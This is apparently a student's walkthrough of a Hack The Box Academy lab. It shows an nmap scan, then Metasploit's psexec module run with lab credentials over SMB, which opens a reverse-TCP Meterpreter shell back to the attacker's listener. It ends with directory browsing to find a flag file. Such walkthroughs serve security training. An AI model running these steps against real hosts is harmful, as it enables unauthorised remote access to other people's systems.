### HTB Pentester Path <br>
### Shells & Payloads - Automating Payloads & Delivery with Metasploit Lab <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>

---

IP:
10.129.123.109

---

### Question 1:
What command language interpreter is used to establish a system shell session with the target?

&#x1F6A9; **powershell**, because the module listed refrences using psexec by Mark Russinovich.

---

### Question 2:
Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

Started with an Nmap scan:


	$ nmap -sV -sC -A -F -v -Pn 10.129.123.109
	
	PORT    STATE SERVICE      VERSION
	7/tcp   open  echo
	9/tcp   open  discard?
	13/tcp  open  daytime      Microsoft Windows USA daytime
	80/tcp  open  http         Microsoft IIS httpd 10.0
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: IIS Windows
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows 10 Pro 18363 microsoft-ds (workgroup: WORKGROUP)
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=9/18%OT=7%CT=21%CU=40699%PV=Y%DS=2%DC=T%G=Y%TM=68CC
	OS:82F0%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=109%TI=I%II=I%SS=S%TS=U)S
	OS:EQ(SP=FE%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=FE%GCD=1%ISR=109%
	OS:TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=FE%GCD=1%ISR=109%TI=RD%CI=I%II=I%TS=U)O
	OS:PS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6
	OS:=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=
	OS:Y%T=80%W=FFFF%O=M552NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
	OS:=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%
	OS:A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%D
	OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
	OS:O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=O%A=O%F=R%O=%RD=0%Q=)T7(R=N)T7(R
	OS:=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F
	OS:=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
	OS:%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
	
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=254 (Good luck!)
	IP ID Sequence Generation: Incremental
	Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-os-discovery: 
	|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
	|   OS CPE: cpe:/o:microsoft:windows_10::-
	|   Computer name: Shells-Win10
	|   NetBIOS computer name: SHELLS-WIN10\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-18T15:08:36-07:00
	| smb2-time: 
	|   date: 2025-09-18T22:08:35
	|_  start_date: N/A
	|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| p2p-conficker: 
	|   Checking for Conficker.C or higher...
	|   Check 1 (port 33576/tcp): CLEAN (Couldn't connect)
	|   Check 2 (port 63036/tcp): CLEAN (Couldn't connect)
	|   Check 3 (port 48874/udp): CLEAN (Timeout)
	|   Check 4 (port 40929/udp): CLEAN (Failed to receive data)
	|_  0/4 checks are positive: Host is CLEAN or ports are blocked
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)


SMB looks...desirable. Lets search for exploits in MSF:

	$ sudo msfconsole

	[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_relay) >> search smb windows psexec
	
	Matching Modules
	================
	
	   #   Name                                         Disclosure Date  Rank       Check  Description
	   -   ----                                         ---------------  ----       -----  -----------
	   0   exploit/windows/smb/smb_relay                2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
	   1     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
	   2     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
	   3     \_ target: Automatic                       .                .          .      .
	   4     \_ target: PowerShell                      .                .          .      .
	   5     \_ target: Native upload                   .                .          .      .
	   6     \_ target: MOF upload                      .                .          .      .
	   7     \_ target: Command                         .                .          .      .
	   8   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
	   9     \_ target: Automatic                       .                .          .      .
	   10    \_ target: PowerShell                      .                .          .      .
	   11    \_ target: Native upload                   .                .          .      .
	   12    \_ target: MOF upload                      .                .          .      .
	   13    \_ AKA: ETERNALSYNERGY                     .                .          .      .
	   14    \_ AKA: ETERNALROMANCE                     .                .          .      .
	   15    \_ AKA: ETERNALCHAMPION                    .                .          .      .
	   16    \_ AKA: ETERNALBLUE                        .                .          .      .
	   17  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
	   18    \_ AKA: ETERNALSYNERGY                     .                .          .      .
	   19    \_ AKA: ETERNALROMANCE                     .                .          .      .
	   20    \_ AKA: ETERNALCHAMPION                    .                .          .      .
	   21    \_ AKA: ETERNALBLUE                        .                .          .      .
	   22  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
	   23  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
	   24    \_ target: Automatic                       .                .          .      .
	   25    \_ target: PowerShell                      .                .          .      .
	   26    \_ target: Native upload                   .                .          .      .
	   27    \_ target: MOF upload                      .                .          .      .
	   28    \_ target: Command                         .                .          .      .
	   29  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
	   30    \_ target: Automatic                       .                .          .      .
	   31    \_ target: Native upload                   .                .          .      .
	
	
	Interact with a module by name or index. For example info 31, use 31 or use exploit/windows/smb/webexec
	After interacting with a module you can manually set a TARGET with set TARGET 'Native upload'
	
cake, now we use the psexec exploit and fill in the parameter:

	[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_relay) >> use 23
		[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
		[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
		[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> show options
		
	Module options (exploit/windows/smb/psexec):
	
	   Name                  Current Setting  Required  Description
	   ----                  ---------------  --------  -----------
	   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
	   SERVICE_DISPLAY_NAME                   no        The service display name
	   SERVICE_NAME                           no        The service name
	   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
	
	
	   Used when connecting via an existing SESSION:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SESSION                   no        The session to run this module on
	
	
	   Used when making a new connection via RHOSTS:
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT      445              no        The target port (TCP)
	   SMBDomain  .                no        The Windows domain to use for authentication
	   SMBPass                     no        The password for the specified username
	   SMBUser                     no        The username to authenticate as
	
	
	Payload options (windows/meterpreter/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     85.9.198.223     yes       The listen address (an interface may be specified)
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic
	
	
	
	View the full module info with the info, or info -d command.
	
	[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set rhosts 10.129.123.109
	rhosts => 10.129.123.109
	[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbuser htb-student
	smbuser => htb-student
	[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set smbpass HTB_@cademy_stdnt!
	[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set lhost 10.10.15.152
	lhost => 10.10.15.152
	[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> exploit
	[*] Started reverse TCP handler on 10.10.15.152:4444 
	[*] 10.129.123.109:445 - Connecting to the server...
	[*] 10.129.123.109:445 - Authenticating to 10.129.123.109:445 as user 'htb-student'...
	[*] 10.129.123.109:445 - Selecting PowerShell target
	[*] 10.129.123.109:445 - Executing the payload...
	[+] 10.129.123.109:445 - Service start timed out, OK if running a command or non-service executable...
	[*] Sending stage (177734 bytes) to 10.129.123.109
	[*] Meterpreter session 1 opened (10.10.15.152:4444 -> 10.129.123.109:49875) at 2025-09-18 17:46:03 -0500


BOOM popped a meterpreter shell, and searched for the users Documents DIR:


	(Meterpreter 1)(C:\Windows\system32) > 
	(Meterpreter 1)(C:\Windows\system32) > cd ..
	(Meterpreter 1)(C:\Windows) > cd ..
	(Meterpreter 1)(C:\) > pwd
	C:\
	(Meterpreter 1)(C:\) > dir
	Listing: C:\
	============
	
	Mode              Size   Type  Last modified              Name
	----              ----   ----  -------------              ----
	040777/rwxrwxrwx  4096   dir   2021-10-16 11:08:40 -0500  $Recycle.Bin
	040777/rwxrwxrwx  0      dir   2021-08-18 07:44:27 -0500  $WinREAgent
	040777/rwxrwxrwx  0      dir   2020-12-15 04:36:04 -0600  Documents and Settings
	040777/rwxrwxrwx  0      dir   2020-12-14 21:22:20 -0600  PerfLogs
	040555/r-xr-xr-x  8192   dir   2021-10-07 16:30:39 -0500  Program Files
	040555/r-xr-xr-x  4096   dir   2021-09-21 15:29:08 -0500  Program Files (x86)
	040777/rwxrwxrwx  4096   dir   2021-10-16 11:08:51 -0500  ProgramData
	040777/rwxrwxrwx  0      dir   2020-12-15 04:36:09 -0600  Recovery
	040777/rwxrwxrwx  4096   dir   2025-09-18 17:19:59 -0500  System Volume Information
	040555/r-xr-xr-x  4096   dir   2021-10-16 11:08:05 -0500  Users
	040777/rwxrwxrwx  24576  dir   2021-10-12 19:39:29 -0500  Windows
	040777/rwxrwxrwx  0      dir   2021-08-18 15:58:59 -0500  inetpub
	000000/---------  0      fif   1969-12-31 18:00:00 -0600  pagefile.sys
	000000/---------  0      fif   1969-12-31 18:00:00 -0600  swapfile.sys
	
	(Meterpreter 1)(C:\) > cd Users
	(Meterpreter 1)(C:\Users) > ls
	Listing: C:\Users
	=================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	040777/rwxrwxrwx  8192  dir   2020-12-23 12:11:40 -0600  Administrator
	040777/rwxrwxrwx  0     dir   2019-03-19 00:02:04 -0500  All Users
	040555/r-xr-xr-x  8192  dir   2020-12-15 04:36:04 -0600  Default
	040777/rwxrwxrwx  0     dir   2019-03-19 00:02:04 -0500  Default User
	040777/rwxrwxrwx  8192  dir   2021-09-22 12:09:44 -0500  DefaultAppPool
	040777/rwxrwxrwx  8192  dir   2021-10-07 16:37:19 -0500  Leo
	040555/r-xr-xr-x  4096  dir   2020-12-14 20:41:58 -0600  Public
	040777/rwxrwxrwx  8192  dir   2021-08-18 07:46:21 -0500  bob
	100666/rw-rw-rw-  174   fil   2019-03-18 23:49:34 -0500  desktop.ini
	040777/rwxrwxrwx  8192  dir   2021-10-19 18:04:01 -0500  htb-student
	
	(Meterpreter 1)(C:\Users) > cd htb-student
	(Meterpreter 1)(C:\Users\htb-student) > ls
	Listing: C:\Users\htb-student
	=============================
	
	Mode              Size     Type  Last modified              Name
	----              ----     ----  -------------              ----
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  3D Objects
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  AppData
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Application Data
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Contacts
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Cookies
	040555/r-xr-xr-x  4096     dir   2021-10-16 15:11:56 -0500  Desktop
	040555/r-xr-xr-x  4096     dir   2021-10-16 15:17:46 -0500  Documents
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Downloads
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Favorites
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Links
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Local Settings
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Music
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  My Documents
	100666/rw-rw-rw-  1310720  fil   2021-10-19 18:04:01 -0500  NTUSER.DAT
	100666/rw-rw-rw-  65536    fil   2021-10-16 11:08:05 -0500  NTUSER.DAT{fd9a35db-49fe-11e9-aa2c-248a07783950}.TM.blf
	100666/rw-rw-rw-  524288   fil   2021-10-16 11:08:05 -0500  NTUSER.DAT{fd9a35db-49fe-11e9-aa2c-248a07783950}.TMContainer00000000000000
	                                                            000001.regtrans-ms
	100666/rw-rw-rw-  524288   fil   2021-10-16 11:08:05 -0500  NTUSER.DAT{fd9a35db-49fe-11e9-aa2c-248a07783950}.TMContainer00000000000000
	                                                            000002.regtrans-ms
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  NetHood
	040555/r-xr-xr-x  0        dir   2021-10-16 11:09:31 -0500  OneDrive
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:42 -0500  Pictures
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  PrintHood
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Recent
	040555/r-xr-xr-x  0        dir   2021-10-16 11:08:07 -0500  Saved Games
	040555/r-xr-xr-x  4096     dir   2021-10-16 11:08:40 -0500  Searches
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  SendTo
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Start Menu
	040777/rwxrwxrwx  0        dir   2021-10-16 11:08:05 -0500  Templates
	040555/r-xr-xr-x  0        dir   2021-10-19 01:25:36 -0500  Videos
	100666/rw-rw-rw-  327680   fil   2021-10-16 11:08:05 -0500  ntuser.dat.LOG1
	100666/rw-rw-rw-  65536    fil   2021-10-16 11:08:05 -0500  ntuser.dat.LOG2
	100666/rw-rw-rw-  20       fil   2021-10-16 11:08:05 -0500  ntuser.ini
	
	(Meterpreter 1)(C:\Users\htb-student) > cd Documents
	(Meterpreter 1)(C:\Users\htb-student\Documents) > ls
	Listing: C:\Users\htb-student\Documents
	=======================================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Music
	040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Pictures
	040777/rwxrwxrwx  0     dir   2021-10-16 11:08:05 -0500  My Videos
	100666/rw-rw-rw-  402   fil   2021-10-16 11:08:07 -0500  desktop.ini
	100666/rw-rw-rw-  268   fil   2021-10-16 15:16:01 -0500  staffsalaries.txt

&#x1F6A9; found **staffsal---edit--.txt**.
